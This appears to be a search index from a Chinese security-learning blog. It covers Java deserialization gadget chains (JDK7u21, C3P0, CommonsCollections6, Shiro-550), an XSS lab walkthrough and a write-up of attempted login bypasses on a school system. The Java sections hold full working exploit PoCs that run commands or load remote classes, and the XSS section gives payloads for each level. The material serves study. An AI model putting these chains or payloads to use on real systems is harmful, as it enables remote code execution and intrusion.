clz.getDeclaredConstructor(Class.class, Map.class); c.setAccessible(true); InvocationHandler handler = (InvocationHandler) c.newInstance(Templates.class, hashMap); Templates proxy = (Templates) Proxy.newProxyInstance(tem.getClass().getClassLoader(), tem.getClass().getInterfaces(), handler); HashSet hashSet = new HashSet(); hashSet.add(tem); hashSet.add(proxy); } public static void setValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } }进行调用，看到两个 hash 值确实相等了，那么代理类会调用 equals 方法，从而触发 invoke 。 最后调用到了 getOutputProperties() 方法， 成功弹出计算机， 但是这里是通过 add 方法调用进行触发的，现在更改一下 poc 使得在 readobject 的时候进行调用，就是 add 顺序调一下。 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class jdk7u21 { public static void main(String[] args)throws Exception { TemplatesImpl tem = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/poc.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); HashMap hashMap = new HashMap(); hashMap.put(\"f5a5a608\",tem); Class clz=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor c = clz.getDeclaredConstructor(Class.class, Map.class); c.setAccessible(true); InvocationHandler handler = (InvocationHandler) c.newInstance(Templates.class, hashMap); Templates proxy = (Templates) Proxy.newProxyInstance(tem.getClass().getClassLoader(), tem.getClass().getInterfaces(), handler); HashSet hashSet = new HashSet(); hashSet.add(proxy); hashSet.add(tem); serilize(hashSet); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeOb","date":"2024-10-20","objectID":"/posts/jdk7u21/:2:0","tags":["java","反序列化"],"title":"jdk7u21 链子分析","uri":"/posts/jdk7u21/"},{"categories":["javasec"],"content":"漏洞修复 在 jdk \u003e 7u21 的版本，修复了这个漏洞，AnnotationInvocationHandler 的 readObject() 方法增加了异常抛出，导致反序列化失败 参考：https://nivi4.notion.site/7u21-be753754767a4e13a638c70ad9a48110 参考：https://www.cnblogs.com/BUTLER/articles/16478462.html ","date":"2024-10-20","objectID":"/posts/jdk7u21/:3:0","tags":["java","反序列化"],"title":"jdk7u21 链子分析","uri":"/posts/jdk7u21/"},{"categories":["漏洞学习"],"content":"XSS靶场 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:0:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-1 发现有个name传参，看源代码 get 传参 name 的值 test 插入了 html 里头 然后应用 alter 函数就能触发第二关，那么传入 \u003cscript\u003ealert()\u003c/script\u003e ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:1:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-2 传入参数值 \u003cscript\u003ealert()\u003c/script\u003e查看源代码 \u003c\u003e符号被转义，但是下面一句是正常的，传入的 “\u003e和\u003c“与前后形成闭合。从而被当作标签处理，所以传入 \"\u003e\u003cscript\u003ealert()\u003c/script\u003e\u003c\"","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:2:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-3 查看源码发现上下都被转义了， 有 input 标签，那么就 onfocus 事件绕过，所以传入 ' onfocus=javascript:alert() '单引号和前后闭合，javascript: 是伪协议，传入后再次点击输入框触发。 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:3:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-4 查看源代码发现 input 标签会自动删除尖括号，继续用level-3的方法，改成双引号闭合。记得空格 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:4:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-5 查看源代码， 直接看源码吧，发现函数 strtolower 会转为小写，所以不能大小写绕过。前几关的方法也用不了了，那么这里传入 \"\u003e\u003ca href=javascript:alert()\u003exxx\u003c/a\u003e\u003c\" ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:5:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-6 比上一关多过滤了 href ，但这关可以使用大小写绕过 因为str_replace()函数不区分大小写，这里又没加大写转小写的函数 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:6:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"leve-7 查看源码发现会把关键字替换为空。可以双写绕过 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:7:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-8 直接看源码 过滤的有点多，可以使用unicode编码绕过 在线编码网址：https://www.matools.com/code-convert-unicode，和另一种的区别 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:8:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-9 多了个条件 也就是传的值要有 http:// ，即传入 \u0026#106;\u0026#97;\u0026#118;\u0026#97;\u0026#115;\u0026#99;\u0026#114;\u0026#105;\u0026#112;\u0026#116;\u0026#58;\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026#40;\u0026#41;/* http:// */ ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:9:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-10 查看源码 发现有隐藏参数 t_sort ，可以看到还过滤了尖括号，用 onfocus 事件绕过。这里还要把 type 从 hidden 改为 test \" onfocus=javascript:alert() type=\"text ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:10:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-11 ![屏幕截图 2024-01-10 142511](https://raw.githubusercontent.com/gaorenyusi/img/master/img/屏幕截图 2024-01-10 142511.png) 四个隐藏参数，都进行传参，发现只有 t_sort 有数据，但被转义了，然后看wp说 ref 是 referer 头部的数据，然后过滤了\u003c\u003e 所以上面的payload继续用，利用hacker传到referer头部 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:11:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-12 看源码 从ua不难看出是user agent头部，和上关区别不大 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:12:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-13 这次参数是 t_cook ，那么看来是cookie了，抓包看看参数 user，那么给user传上面构造。得到 这个也行 \" onclick=alert() type=\"text ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:13:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-14 这关卡的 iframe 引用的地址打不开了，参考师傅们的14关可以自己本地搭建，意思就是引用到本地的网址，在本地放上 exif xss 漏洞。 复制师傅们的代码，开启 exif ， 把地址改为 http://127.0.0.1:89，然后上传的图片里面有xss恶意代码就会因为exif解析而触发， 后面换成了index.php，端口换一下就行，影响不大， ![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/屏幕截图 2024-01-10 152026.png) 参考：https://blog.csdn.net/qq_40929683/article/details/120422266 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:14:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-15 源代码 ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号列如 然后有 但是不能包涵那些直接弹窗的东西如\u003cscript\u003e，可以包含手动弹窗，比如\u003ca\u003e、\u003cinput\u003e、\u003cimg\u003e、\u003cp\u003e标签等等，那么构造 ?src='/level1.php?name=\u003cimg src=1 onmouseover=alert()\u003e'![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/屏幕截图 2024-01-10 153113.png) ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:15:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-16 直接看源码 首先 script 标签被过滤了，那么换其他的标签（用不需要用 / 符号的标签），至于空格用%0a代替 \u003cimg%0asrc=\"x\"%0aonerror=alert(\"xss\");\u003e ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:16:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-17 直接看源代码 简单解释就是包含正确的区域就行了，把源码改为包含level15.png（swf文件要下载 flash player 插件才行）就能正常包含区域，然后传入 ?arg01= onmouseover\u0026arg02=alert() ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:17:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-18 看源码和17关差不多，改了包含文件直接传17关的payload ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:18:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-19 涉及到了 swf 的反编译，下载个flash player看看（不知道为啥重复了几遍）。根据师傅解释这里flash里面提示sifr.js是没有定义的，所以需要反编译看看源码。 工具 jpexs 下载后，跟着师傅做 发现flash显示的内容 发现%s是显示内容的一个变量，溯源%s， 读不懂，看师傅wp大概是和version有关， 看不懂一点😓😓😓，不管那么多了，跟着传入payload，那个version就是反编译看出来的，大概是version=123，然后find里%s就显示的123 继续 arg01=version\u0026arg02=\u003ca href=\"javascript:alert(/xss/)\"\u003exss\u003c/a\u003e ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:19:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-20 也要反编译，看看wp得了 参考：https://blog.csdn.net/u014029795/article/details/103217680 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:20:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["src"],"content":"记一次 edu 证书站失败的逻辑漏洞 闲来无事，在礼物中心看到个证书站，看名称感觉应该挺好挖的，简单信息搜集一波，在 hunter 上查看子域名，发现有个管理系统 访问该链接，是个登录框 现在需要去搞一手学号什么的了（因为是随便看看的所以没有先信息搜集），利用 hack 语法找了半天只找到 16，17 级的学生学号，尝试利用显示账号错误，看来还是需要找近几年的了， 又去 dy，xhs 等社交平台上找了半天发现没有竟然没找到，最后直接通过 16，17 的学号重新构造爆破的 24 级学号，尝试弱密码登录发现没戏，直接试试抓包改回包 把回包的 402 改为 200 提示 说明应该是成功登录进去了，但是还是需要对用户进行鉴权才会显示功能点，那么既然登录存在逻辑漏洞，是否修改密码也存在相同的漏洞， 同理抓包修改 发现直接来到了设置新密码，说明逻辑漏洞绕过成功了， 最后修改密码成功， 再次进行登录，发现还是提示账号或密码有误， 猜测该逻辑漏洞可能只是前端逻辑漏洞，通过修改的响应值只能决定前端的显示。数据并没有写入后端。 ","date":"2024-10-20","objectID":"/posts/edusrc/:0:0","tags":["src"],"title":"记一次 edu 证书站失败的逻辑漏洞","uri":"/posts/edusrc/"},{"categories":["javasec"],"content":"C3P0 链子分析学习 ","date":"2024-10-16","objectID":"/posts/c3p0/:0:0","tags":["java","反序列化"],"title":"C3P0 链子分析学习","uri":"/posts/c3p0/"},{"categories":["javasec"],"content":"概述 C3P0是一个开源的数据库连接池，它实现了数据源与JNDI绑定，支持JDBC3规范和实现了JDBC2的标准扩展说明的Connection和Statement池的DataSources对象。即将用于连接数据库的连接整合在一起形成一个随取随用的数据库连接池，使用它的开源项目有Hibernate、Spring等。 连接池：“我们在讲多线程的时候说过，创建线程是一个昂贵的操作，如果有大量的小任务需要执行，并且频繁地创建和销毁线程，实际上会消耗大量的系统资源，往往创建和消耗线程所耗费的时间比执行任务的时间还长，所以，为了提高效率，可以用线程池。 类似的，在执行JDBC的增删改查的操作时，如果每一次操作都来一次打开连接，操作，关闭连接，那么创建和销毁JDBC连接的开销就太大了。为了避免频繁地创建和销毁JDBC连接，我们可以通过连接池（Connection Pool）复用已经创建好的连接。” ","date":"2024-10-16","objectID":"/posts/c3p0/:1:0","tags":["java","反序列化"],"title":"C3P0 链子分析学习","uri":"/posts/c3p0/"},{"categories":["javasec"],"content":"环境搭建 添加依赖 \u003cdependency\u003e \u003cgroupId\u003ecom.mchange\u003c/groupId\u003e \u003cartifactId\u003ec3p0\u003c/artifactId\u003e \u003cversion\u003e0.9.5.2\u003c/version\u003e \u003c/dependency\u003e","date":"2024-10-16","objectID":"/posts/c3p0/:2:0","tags":["java","反序列化"],"title":"C3P0 链子分析学习","uri":"/posts/c3p0/"},{"categories":["javasec"],"content":"Gadget C3P0常见的利用方式有如下三种 URLClassLoader远程类加载 JNDI注入 利用HEX序列化字节加载器进行反序列化攻击 ","date":"2024-10-16","objectID":"/posts/c3p0/:3:0","tags":["java","反序列化"],"title":"C3P0 链子分析学习","uri":"/posts/c3p0/"},{"categories":["javasec"],"content":"URLClassLoader远程类加载 链子分析 就是加载远程类进行利用 Gadget Chain： PoolBackedDataSourceBase#readObject ReferenceSerialized#getObject ReferenceableUtils#referenceToObject ObjectFactory#getObjectInstance定位到 PoolBackedDataSourceBase#readObject 方法， 看到如果对象类型为 IndirectlySerialized，会调用其 getObject 方法，发现只有静态类 ReferenceSerialized 继承了 IndirectlySerialized 接口，跟进其 getObject 方法， 看见这里初始化上下文，然后调用了 lookup ，那如果这里能控制 contextName 变量就能进行 JNDI 注入， 现在就是如何控制变量o为ReferenceSerialized对象，来到 PoolBackedDataSourceBase 的writeObject 方法， 看见反序列化了 connectionPoolDataSource 对象，而该对象没有继承 Serializable 接口 所以在序列化的时候会进入 catch 模块，在 catch 模块会调用 indirector.indirectForm 处理后在进行序列化，跟进ReferenceIndirector.indirectForm 方法。 看见会返回一个 ReferenceSerialized 对象，再跟进其构造函数 这里控制的是 reference 参数，但这里的属性contextName为默认null且不可控，所以不能触发JNDI注入， 继续跟进 ReferenceSerialized#getObject 方法，其调用了 ReferenceableUtils#referenceToObject 方法 其中 ref 变量是可以控制的，所以 fClassName 也可以控制，然后先是获取上下文构造器，然后如果 fClassLocation 就直接使用当前上下文构造器进行加载，反之使用 URLClassLoader 进行远程加载，而这个 fClassLocation 我们同样是可以控制的。 poc 构造 先创建个继承了ConnectionPoolDataSource 接口和 Referenceable 的类，并且重写接口ConnectionPoolDataSource 以及其父类 CommonDataSource 接口的方法， public static class EXP_Loader implements ConnectionPoolDataSource, Referenceable{ @Override public Reference getReference() throws NamingException { return new Reference(\"poc\",\"poc\",\"http://127.0.0.1:8888/\"); } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PooledConnection getPooledConnection(String user, String password) throws SQLException { return null; } @Override public PrintWriter getLogWriter() throws SQLException { return null; } @Override public void setLogWriter(PrintWriter out) throws SQLException { } @Override public void setLoginTimeout(int seconds) throws SQLException { } @Override public int getLoginTimeout() throws SQLException { return 0; } @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; } }因为上面看到在序列化时需要序列化 connectionPoolDataSource 对象，才能触发 catch 模块返回 ReferenceSerialized 对象，朔源发现其赋值的地方，是调用 setConnectionPoolDataSource 方法进行赋值的， 然后至于这个类是不是重写不重要，主要是需要控制 reference 参数，所以这里直接写个类只需要满足是connectionPoolDataSource 对象，然后 reference 参数改为我们控制的。 然后将其实例化，调用 setConnectionPoolDataSource 方法进行赋值，赋值将其序列化 public static void Pool_Serial() throws PropertyVetoException,NoSuchFieldException, IllegalAccessException, IOException { //也可以反射修改connectionPoolDataSource属性值，这里直接调用方法好了 PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false); poolBackedDataSourceBase.setConnectionPoolDataSource(new EXP_Loader()); FileOutputStream fos = new FileOutputStream(new File(\"exp.bin\")); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(poolBackedDataSourceBase); } public static void Pool_Deserial() throws IOException, ClassNotFoundException { FileInputStream fis = new FileInputStream(new File(\"exp.bin\")); ObjectInputStream objectInputStream = new ObjectInputStream(fis); objectInputStream.readObject(); } public static void main(String[] args) throws IOException, PropertyVetoException,NoSuchFieldException, IllegalAccessException, ClassNotFoundException { Pool_Serial(); Pool_Deserial(); }综上，完整的 poc package org.example; import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase; import javax.naming.NamingException; import javax.naming.Reference; import javax.naming.Referenceable; import javax.sql.ConnectionPoolDataSource; import javax.sql.PooledConnection; import java.beans.PropertyVetoException; import java.io.*; import java.lang.reflect.Field; import java.sql.SQLException; import java.sql.SQLFeatureNotSupportedException; import java.util.logging.Logger; public class C3P0 { public static class EXP_Loader implements ConnectionPoolDataSource, Referenceable{ @Override public Reference getReference() throws NamingException { return new Reference(\"poc\",\"poc\",\"http://127.0.0.1:8888/\"); } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PooledConnection get","date":"2024-10-16","objectID":"/posts/c3p0/:3:1","tags":["java","反序列化"],"title":"C3P0 链子分析学习","uri":"/posts/c3p0/"},{"categories":["javasec"],"content":"JNDI注入 链子分析 Gadget #修改jndiName JndiRefConnectionPoolDataSource#setJndiName -\u003e JndiRefForwardingDataSource#setJndiName #JNDI调用 JndiRefConnectionPoolDataSource#setLoginTime -\u003e WrapperConnectionPoolDataSource#setLoginTime -\u003e JndiRefForwardingDataSource#setLoginTimeout -\u003e JndiRefForwardingDataSource#inner -\u003e JndiRefForwardingDataSource#dereference() -\u003e Context#lookup定位到 JndiRefConnectionPoolDataSource 类，漏洞点在其调用的 WrapperConnectionPoolDataSource#setLoginTimeout 函数 跟进看到再次调用了 setLoginTimeout 函数， 先看 getNestedDataSource() 方法，返回了 nestedDataSource 变量， 朔源发现该变量是通过 setNestedDataSource 方法进行的赋值 在 JndiRefConnectionPoolDataSource 类调用 setLoginTimeout 时。对 WrapperConnectionPoolDataSource 进行了实例化并调用了 setNestedDataSource 方法为 nestedDataSource 变量赋值 所以回到上面的 WrapperConnectionPoolDataSource#setLoginTimeout 方法中，继续跟进 JndiRefForwardingDataSource#setLoginTimeout 方法 这里调用 inner 方法，进行跟进 跟进到 dereference() 方法，看到了 lookup 方法，并且 jndiName 我们可以控制，看上面的 gadget，可以通过函数 setJndiName 进行控制 poc 构造 那么剩下的 poc 就简单了 public class C3P02 { public static void main(String[] args)throws Exception { JndiRefConnectionPoolDataSource exp = new JndiRefConnectionPoolDataSource(); exp.setJndiName(\"rmi://localhost:1099/hello\"); exp.setLoginTimeout(1); } } fastjson 链子，变一下打 ql 表达式也可以，以为两个变量存在 setter 方法 public class C3P0 { public static void main(String[] args) throws SQLException { String payload = \"{\" + \"\\\"@type\\\":\\\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\\\",\" + \"\\\"JndiName\\\":\\\"rmi://127.0.0.1:1099/hello\\\", \" + \"\\\"LoginTimeout\\\":0\" + \"}\"; JSON.parse(payload); }","date":"2024-10-16","objectID":"/posts/c3p0/:3:2","tags":["java","反序列化"],"title":"C3P0 链子分析学习","uri":"/posts/c3p0/"},{"categories":["javasec"],"content":"HEX序列化 链子分析 该利用链能够反序列化一串十六进制字符串，因此实际利用需要有存在反序列化漏洞的组件 Gadget #设置userOverridesAsString属性值 WrapperConnectionPoolDataSource#setuserOverridesAsString -\u003e WrapperConnectionPoolDataSourceBase#setUserOverridesAsString #初始化类时反序列化十六进制字节流 WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource -\u003e C3P0ImplUtils#parseUserOverridesAsString -\u003e SerializableUtils#fromByteArray -\u003e SerializableUtils#deserializeFromByteArray -\u003e ObjectInputStream#readObject构造函数触发 定位到 WrapperConnectionPoolDataSource 类的构造函数 跟进到 C3P0ImplUtils.parseUserOverridesAsString 方法，看到先是进行 hex 解码为一个 byte 类型，然后调用了方法 fromByteArray 将其变为 map 类 跟进 看见了 readobject，可以进行反序列化，需要存在可利用的 gadget，这里尝试利用 cc6 ，pom.xml \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.2.1\u003c/version\u003e \u003c/dependency\u003e先构造出 cc6 的链子，去掉反序列化， package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; public class C3P03 { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry Tie=new TiedMapEntry(Lazy,\"aaa\"); HashMap\u003cObject,Object\u003e hashmap = new HashMap\u003c\u003e(); hashmap.put(Tie,\"gaoren\"); Class\u003cLazyMap\u003e lazyMapClass = LazyMap.class; Field factoryField = lazyMapClass.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(Lazy, cha); Lazy.remove(\"aaa\"); serilize(hashmap); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } }然后再 parseUserOverridesAsString 函数中不难看出，hexAscii 就是传入的参数 userOverridesAsString 提取出来的。 而 userOverridesAsString 是通过 getUserOverridesAsString() 方法获得的， 可以通过反射为 userOverridesAsString 赋值， package org.example; import com.mchange.v2.c3p0.ConnectionCustomizer; import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource; import com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.sql.PooledConnection; import java.io.*; import java.sql.SQLException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; public class Main{ public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,new Consta","date":"2024-10-16","objectID":"/posts/c3p0/:3:3","tags":["java","反序列化"],"title":"C3P0 链子分析学习","uri":"/posts/c3p0/"},{"categories":["javasec"],"content":"shiro 反序列化漏洞 ","date":"2024-10-12","objectID":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:0:0","tags":["java","shiro"],"title":"shiro 反序列化漏洞","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"Shiro-550 ","date":"2024-10-12","objectID":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:1:0","tags":["java","shiro"],"title":"shiro 反序列化漏洞","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"漏洞原理 影响版本：Apache Shiro \u003c 1.2.4 特征判断：返回包中包含rememberMe=deleteMe字段。 为了让浏览器或服务器重启后用户不丢失登录状态，Shiro 支持将持久化信息序列化并加密后保存在 Cookie 的 rememberMe 字段中，下次读取时进行解密再反序列化。Payload产生的过程： 命令=\u003e序列化=\u003eAES加密=\u003ebase64编码=\u003eRememberMe Cookie值。这里面比较重要的就是搞到 AES 加密的密钥。 而在 Shiro 1.2.4 版本之前内置了一个默认且固定的加密 Key，如果没有更改默认密码，攻击者就可以伪造任意的 rememberMe Cookie，进而触发反序列化漏洞。 ","date":"2024-10-12","objectID":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:1:1","tags":["java","shiro"],"title":"shiro 反序列化漏洞","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"环境搭建 分别下载 shiro 下载地址：https://github.com/jas502n/SHIRO-550（下载对应war包即可） shiro 源码下载地址：https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4 打开源码文件目录，然后配置 tomcat 服务， 然后选择下载的 shiro war 包 在项目中也需要更改为 jdk1.7 版本。 最后运行访问端口。 具体参考：https://blog.csdn.net/qq_44769520/article/details/123476443 ","date":"2024-10-12","objectID":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:1:2","tags":["java","shiro"],"title":"shiro 反序列化漏洞","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"漏洞分析 rememberMe 生成 登录抓包，看见在成功登录后给了一个 set-cookie， 回到源码看看这串 cookie 是怎么生成的，全局搜索 cookie 相关处理的类，发现了 CookieRememberMeMananger 类，分析该类的方法，发现方法 rememberSerializedIdentity 就是生成 cookie 的函数，不过这里只能看到把 serialized 进行了 base64 编码 发现其在函数 AbstractRememberMeManager#rememberIdentity 调用， 跟进看到调用了函数 convertPrincipalsToBytes 对 cookie 数据进行加密， 来到 convertPrincipalsToBytes 函数，首先进行了序列化，然后进行加密， 加密的话就是个 AES 加密，看一下其 key 是通过 getEncryptionCipherKey 函数来的， 而这个函数其实就是返回了个常量，所以现在要找谁给常量 encryptionCipherKey 赋了值。 找到函数 setCipherKey，其调用的 setEncryptionCipherKey 和 setDecryptionCipherKey 就是分别给加密和解密设置 key 